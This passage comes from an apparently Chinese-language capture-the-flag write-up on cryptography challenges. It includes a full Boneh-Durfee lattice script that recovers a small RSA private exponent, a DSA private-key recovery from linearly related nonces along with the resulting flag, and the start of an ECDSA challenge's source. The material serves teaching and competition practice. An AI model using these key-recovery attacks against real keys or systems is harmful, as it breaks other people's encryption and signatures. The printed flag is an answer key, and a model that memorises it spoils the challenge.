r1, s1) = 535874494834828755542711401117152397489711233142, 117859946800380767356190121030392492081340616512, 26966646740134065096660259687229179143947213779</span><br><span class="line">(h2, r2, s2) = 236574518096866758760287021848258048065293279716, 863199000523521111517835459866422731857447792677, 517924607931342012033031470185302567344725962419</span><br></pre></td></tr></tbody></table></figure><p>看过题目后，发现a的值被删掉了，后半部分加密时<strong>dsa数字签名</strong>，第一部分则是<strong>RSA加密</strong>结果，而在这个RSA加密中由于d较小，所以可以用boneh and durfee攻击得到d</p><p>boneh and durfee脚本：<a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage">RSA-and-LLL-attacks/boneh_durfee.sage at master · mimoo/RSA-and-LLL-attacks (github.com)</a></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Config</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don't have a correct</span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this</span></span><br><span class="line"><span class="string">doesn't necesseraly mean that no solutions</span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don't work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(nothelpful, <span class="string">"/"</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">" vectors are not helpful"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">'%02d '</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">'0'</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">'X'</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">' '</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">'~'</span></span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let's check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"* removing unhelpful vector"</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">"* removing unhelpful vectors"</span>, ii, <span class="string">"and"</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn't bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"failure"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"We do not have det &lt; bound. Solutions might not be found."</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Try with highers m and t."</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"size det(L) - size e^(m*n) = "</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"optimizing basis of the lattice via LLL, this can take a long time"</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"LLL is done!"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"looking for independent vectors in the lattice"</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"found them, using vectors"</span>, pol1_idx, <span class="string">"and"</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"no independant vectors could be found. This should very rarely happen..."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Your prediction (delta) is too small"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = <span class="number">98871082998654651904594468693622517613869880791884929588100914778964766348914919202255397776583412976785216592924335179128220634848871563960167726280836726035489482233158897362166942091133366827965811201438682117312550600943385153640907629347663140487841016782054145413246763816202055243693289693996466579973</span></span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">76794907644383980853714814867502708655721653834095293468287239735547303515225813724998992623067007382800348003887194379223500764768679311862929538017193078946067634221782978912767213553254272722105803768005680182504500278005295062173004098796746439445343896868825218704046110925243884449608326413259156482881</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">0.274</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">7</span> <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = <span class="built_in">int</span>((<span class="number">1</span>-<span class="number">2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don't touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = <span class="built_in">int</span>((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"=== checking values ==="</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"* delta:"</span>, delta)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"* delta &lt; 0.292"</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"* size of e:"</span>, <span class="built_in">int</span>(log(e)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"* size of N:"</span>, <span class="built_in">int</span>(log(N)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"* m:"</span>, m, <span class="string">", t:"</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"=== running algorithm ==="</span>)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"=== solution found ==="</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"x:"</span>, solx)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"y:"</span>, soly)</span><br><span class="line"></span><br><span class="line">        d = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"private key found:"</span>, d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"=== no solution was found ==="</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>((<span class="string">"=== %s seconds ==="</span> % (time.time() - start_time)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    example()</span><br><span class="line"><span class="comment"># d = 1493519932573300884636712093929290985070801830526216141153447882450934993737739146621</span></span><br></pre></td></tr></tbody></table></figure><p>求出来d，就可以求出a</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">d = <span class="number">1493519932573300884636712093929290985070801830526216141153447882450934993737739146621</span></span><br><span class="line">c = <span class="number">13847199761503953970544410090850216804358289955503229676987212195445226107828814170983735135692611175621170777484117542057117607579344112008580933900051471041224296342157618857321522682033260246480258856376097987259016643294843196752685340912823459403703609796624411954082410762846356541101561523204985391564</span></span><br><span class="line">n = <span class="number">98871082998654651904594468693622517613869880791884929588100914778964766348914919202255397776583412976785216592924335179128220634848871563960167726280836726035489482233158897362166942091133366827965811201438682117312550600943385153640907629347663140487841016782054145413246763816202055243693289693996466579973</span></span><br><span class="line">a = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># 24601959430759983424400804734518943158892550216065342062971649989571838687333</span></span><br></pre></td></tr></tbody></table></figure><p>接下来就是DSA数字签名过程了，先简单学学，下方是<strong>糖醋小鸡块</strong>师傅的讲解，真的很详细！力荐！（这不是广告！）</p><p><a href="https://lazzzaro.github.io/2020/05/13/crypto-其他加密算法/">其他加密算法 | Lazzaro (lazzzaro.github.io)</a></p><p>现在有：</p><script type="math/tex; mode=display">(h1+x*r1)*k1^{-1}=s1(modq)</script><script type="math/tex; mode=display">(h2+x*r2)*(a*k1+b)^{-1}=s2(modq)</script><p>发现$h1,h2,s1,s2,r1,r2,a,b$都是已知的，那么未知数只有$x,k1$，消参即可求出来</p><script type="math/tex; mode=display">h1+x*r1=k1*s1(modq)</script><script type="math/tex; mode=display">h2+x*r2=(s2*(a*k1+b))(modq)</script><p>移项，让等式左边都变成$x<em>r1</em>r2$</p><script type="math/tex; mode=display">x*r1*r2=( (k1*s1-h1)*r2)(modq)</script><script type="math/tex; mode=display">x*r1*r2=( (s2*(a*k1+b)-h2)*r1)(modq)</script><p>然后做差</p><script type="math/tex; mode=display">r2*(k1*s1-h1)-r1*( (a*k1+b)*s2-h2)=0(modq)</script><p>解出k1后，代入$(h1+x<em>r1)</em>k1^{-1}=s1(modq)$，即可求出x</p><p>exp:</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">a = <span class="number">24601959430759983424400804734518943158892550216065342062971649989571838687333</span></span><br><span class="line">p= <span class="number">161310487790785086482919800040790794252181955976860261806376528825054571226885460699399582301663712128659872558133023114896223014064381772944582265101778076462675402208451386747128794418362648706087358197370036248544508513485401475977401111270352593919906650855268709958151310928767086591887892397722958234379</span></span><br><span class="line">q= <span class="number">1115861146902610160756777713087325311747309309771</span></span><br><span class="line">g= <span class="number">61073566757714587321114447684333928353300944355112378054603585955730395524359123615359185275743626350773632555967063692889668342544616165017003197599818881844811647270423070958521148291118914198811187731689123176313367399492561288350530256722898205674043032421874788802819858438796795768177550638273020791962</span></span><br><span class="line">y= <span class="number">23678147495254433946472657196764372220306841739888385605070426528738230369489739339976134564575544246606937803367113623097260181789372915552172469427842482448570540429192377881186772226796452797182435452490307834205012154495575570994963829345053331967442452842152258650027916313982835119514473311305158299360</span></span><br><span class="line">(h1, r1, s1) = <span class="number">535874494834828755542711401117152397489711233142</span>, <span class="number">117859946800380767356190121030392492081340616512</span>, <span class="number">26966646740134065096660259687229179143947213779</span></span><br><span class="line">(h2, r2, s2) = <span class="number">236574518096866758760287021848258048065293279716</span>, <span class="number">863199000523521111517835459866422731857447792677</span>, <span class="number">517924607931342012033031470185302567344725962419</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">17474742587088593627</span></span><br><span class="line"></span><br><span class="line">k = ((h1*r2+b*s2*r1-r1*h2)*(gmpy2.invert(s1*r2-a*r1*s2,q)))%q</span><br><span class="line">x = ((k*s1-h1)*(gmpy2.invert(r1,q)))%q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(x))</span><br><span class="line"><span class="comment"># b'l1near_k1s_unsafe'</span></span><br><span class="line"><span class="comment"># flag{l1near_k1s_unsafe}</span></span><br></pre></td></tr></tbody></table></figure><h1 id="ez-ECC"><a href="#ez-ECC" class="headerlink" title="ez_ECC"></a>ez_ECC</h1><p>这个题真的很难，参考了<a href="https://tangcuxiaojikuai.xyz/post/35967439.html#more">糖醋小鸡块师傅</a>的文章才懂（<del>懂得不多</del>），道阻且长啊。。。</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">ECDSA算法确实是一种奇妙的算法，它已经在现实世界中得到了广泛的应用。但由于操作问题，我不小心在我的签名中泄露了太多的数据。即使我泄露了这么多数据，也应该是安全的吧？</span><br></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secret,hint,flag,my_own_prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startwith(<span class="string">b'flag{'</span>)</span><br><span class="line"><span class="keyword">assert</span> bytes_to_long(secret).bit_length() == <span class="number">384</span></span><br><span class="line"></span><br><span class="line">curves = ecdsa.curves</span><br><span class="line">NIST256p = curves.NIST256p</span><br><span class="line">NIST384p = curves.NIST384p</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Random_EC</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,state = <span class="literal">None</span>,Gen_Curve = <span class="literal">True</span></span>):</span><br><span class="line">        <span class="keyword">if</span> state == <span class="literal">None</span>:</span><br><span class="line">            self.state = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.state = state</span><br><span class="line">        